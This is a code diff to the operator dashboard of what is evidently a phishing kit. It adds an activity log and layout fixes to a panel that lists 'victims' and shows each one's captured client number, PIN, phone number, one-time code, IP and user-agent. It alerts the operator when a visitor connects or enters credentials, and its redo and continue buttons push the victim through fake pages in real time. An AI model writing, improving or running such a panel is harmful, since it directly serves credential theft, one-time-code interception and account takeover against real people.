@@ -60,9 +60,9 @@
     .btn:hover { background: rgba(255,255,255,.15); border-color: rgba(255,255,255,.2); }
 
     .cred { font-family: monospace; font-size: .8rem; background: #f1f1f1; padding: 2px 4px; border-radius: 3px; color:#000; }
-    .detail { font-size: 12px; color: var(--text-muted); }
-    #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.75); align-items: center; justify-content: center; }
-    #modal .card { max-width: 500px; width: 90%; background: #111; border-color: #333; }
+    .detail { font-size: 12px; color: var(--text-muted); margin-top: 8px; }
+    #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.75); align-items: center; justify-content: center; z-index: 1000; }
+    #modal .card { max-width: 600px; width: 90%; background: #111; border-color: #333; max-height: 90vh; overflow-y: auto; }
     #empty { text-align: center; color: #888; padding: 2rem 0; }
     @media (max-width: 900px) { .stats { grid-template-columns: 1fr; } }
 
@@ -126,6 +126,58 @@
     @keyframes fadeOut {
       to { opacity: 0; transform: translateX(20px); }
     }
+
+    /* Activity Log Styles */
+    .activity-log {
+      margin-top: 20px;
+      border-top: 1px solid rgba(255,255,255,0.1);
+      padding-top: 16px;
+    }
+    .activity-title {
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--text-muted);
+      margin-bottom: 12px;
+    }
+    .activity-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 10px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      font-size: 13px;
+    }
+    .activity-item:last-child { border-bottom: none; }
+    .activity-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      margin-top: 5px;
+      flex-shrink: 0;
+    }
+    .dot-connected { background: var(--blue); }
+    .dot-credentials { background: var(--green); }
+    .dot-phone { background: var(--blue); }
+    .dot-unregister { background: var(--yellow); }
+    .dot-otp { background: var(--green); }
+    .dot-page { background: var(--text-muted); }
+    .activity-content { flex: 1; }
+    .activity-action {
+      font-weight: 500;
+      color: var(--text-primary);
+      margin-bottom: 2px;
+    }
+    .activity-detail {
+      color: var(--text-muted);
+      font-size: 12px;
+    }
+    .activity-time {
+      color: var(--text-muted);
+      font-size: 11px;
+      white-space: nowrap;
+    }
   </style>
 </head>
 <body>
@@ -153,10 +205,14 @@
 
   <div id="modal" onclick="if(event.target===this)closeModal()">
     <div class="card">
-      <div style="display:flex;justify-content:space-between;align-items:center">
+      <div style="display:flex;justify-content:space-between;align-items:center; margin-bottom: 16px;">
         <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn">✕</button>
       </div>
-      <div id="modalBody" style="margin-top:1rem;font-size:13px;line-height:1.6"></div>
+      <div id="modalBody" style="font-size:13px;line-height:1.6"></div>
+      <div id="activitySection" class="activity-log" style="display:none;">
+        <div class="activity-title">Activity Log</div>
+        <div id="activityList"></div>
+      </div>
       <div style="margin-top:1.25rem;display:flex;gap:8px">
         <button id="redoBtn"  class="btn" onclick="act('redo',  currentSid)">🔁 Redo</button>
         <button id="contBtn"  class="btn" onclick="act('cont',  currentSid)">✅ Continue</button>
@@ -189,6 +245,18 @@
       }
     }
 
+    function getActionClass(action) {
+      const map = {
+        'CONNECTED': 'dot-connected',
+        'ENTERED CREDENTIALS': 'dot-credentials',
+        'ENTERED PHONE': 'dot-phone',
+        'CLICKED UNREGISTER': 'dot-unregister',
+        'ENTERED OTP': 'dot-otp',
+        'PAGE CHANGE': 'dot-page'
+      };
+      return map[action] || 'dot-page';
+    }
+
     /* ----------  ALERT SYSTEM  ---------- */
     function showAlert(type, title, description, victimNum) {
       const container = qs('#alert-container');
@@ -215,8 +283,7 @@
       
       alert.onclick = () => {
         alert.remove();
-        // Optional: scroll to victim in table
-        const row = document.querySelector(`tr[data-sid="${victimNum}"]`);
+        const row = document.querySelector(`tr[data-sid="${currentSid}"]`);
         if (row) row.scrollIntoView({ behavior: 'smooth', block: 'center' });
       };
       
@@ -247,11 +314,9 @@
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
         if (!old) {
-          // New session started
           showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
           if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
         } else {
-          // Check for changes
           if (!old.entered && s.entered) {
             showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
           }
@@ -277,8 +342,30 @@
         }
       });
       
-      // Update lastSessions
       lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
+    }
+
+    function renderActivityLog(activityLog) {
+      const container = qs('#activityList');
+      if (!activityLog || activityLog.length === 0) {
+        qs('#activitySection').style.display = 'none';
+        return;
+      }
+      
+      qs('#activitySection').style.display = 'block';
+      container.innerHTML = activityLog.slice().reverse().map(item => {
+        const time = new Date(item.time).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        return `
+          <div class="activity-item">
+            <div class="activity-dot ${getActionClass(item.action)}"></div>
+            <div class="activity-content">
+              <div class="activity-action">${item.action}</div>
+              <div class="activity-detail">${item.detail}</div>
+            </div>
+            <div class="activity-time">${time}</div>
+          </div>
+        `;
+      }).join('');
     }
 
     function render(d){
@@ -320,7 +407,7 @@
         <div class="detail">Session ID</div><div class="cred">${s.sid}</div>
         <div class="detail">Client number</div><div class="cred">${s.email||'—'}</div>
         <div class="detail">PIN</div><div class="cred">${s.password||'—'}</div>
-        <div class="detail">Phone</div><div class="cred">${s.phone||'—'}</span></div>
+        <div class="detail">Phone</div><div class="cred">${s.phone||'—'}</div>
         <div class="detail">OTP</div><div class="cred">${s.otp||'—'}</div>
         <div class="detail">IP</div><div>${s.ip}</div>
         <div class="detail">Platform</div><div>${s.platform}</div>
@@ -328,6 +415,8 @@
         <div class="detail">Page</div><div>${pageTitle(s.page)}</div>
         <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
         <div class="detail">Date</div><div>${localDate}</div>`;
+
+      renderActivityLog(s.activityLog);
 
       qs('#redoBtn').style.display  = (s.page==='success' || (s.page==='unregister.html' && s.unregisterClicked)) ? 'none':'inline-block';
       qs('#contBtn').style.display  =  s.page==='success' ? 'none':'inline-block';
@@ -345,6 +434,12 @@
       jsonData = await fetch('/api/panel').then(r=>r.json());
       checkChanges(jsonData.sessions);
       render(jsonData);
+      
+      // Refresh modal if open
+      if (currentSid && qs('#modal').style.display === 'flex') {
+        const s = jsonData.sessions.find(x => x.sid === currentSid);
+        if (s) renderActivityLog(s.activityLog);
+      }
     }
     load(); setInterval(load,2000);
   </script>
